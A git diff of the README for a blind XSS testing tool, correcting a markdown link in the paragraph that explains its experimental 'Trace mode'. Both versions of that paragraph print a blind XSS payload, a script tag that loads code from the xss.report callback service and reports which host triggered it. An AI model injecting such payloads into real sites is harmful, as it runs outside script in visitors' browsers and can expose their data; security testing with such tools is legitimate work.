@@ -76,7 +76,7 @@ go install -v github.com/ethicalhackingplayground/bxss/v2/cmd/bxss@latest
 ---
 
 ## 📝 What is Trace mode?
-Trace mode is an experimental feature that allows you to track where the BlindXSS got triggered, some third party BlindXSS platforms such as (https://xss.report/)[https://xss.report/] allows you to specify custom parameters in you're payloads, this allows you to track where the BlindXSS got triggered, for example if you specify the parameter `url=https://somehost.com` in your payload, the tool will use the payload `'"><script src=https://xss.report/c/username?url=https://somehost.com></script>` this for testing and upon a trigger you will be able to inspect the DOM and see what host the BlindXSS got triggered from.
+Trace mode is an experimental feature that allows you to track where the BlindXSS got triggered, some third party BlindXSS platforms such as [https://xss.report/](https://xss.report/) allows you to specify custom parameters in you're payloads, this allows you to track where the BlindXSS got triggered, for example if you specify the parameter `url=https://somehost.com` in your payload, the tool will use the payload `'"><script src=https://xss.report/c/username?url=https://somehost.com></script>` this for testing and upon a trigger you will be able to inspect the DOM and see what host the BlindXSS got triggered from.
 
  <img src="https://github.com/ethicalhackingplayground/bxss/blob/master/static/xss.report.png" alt="Xss Report">
 
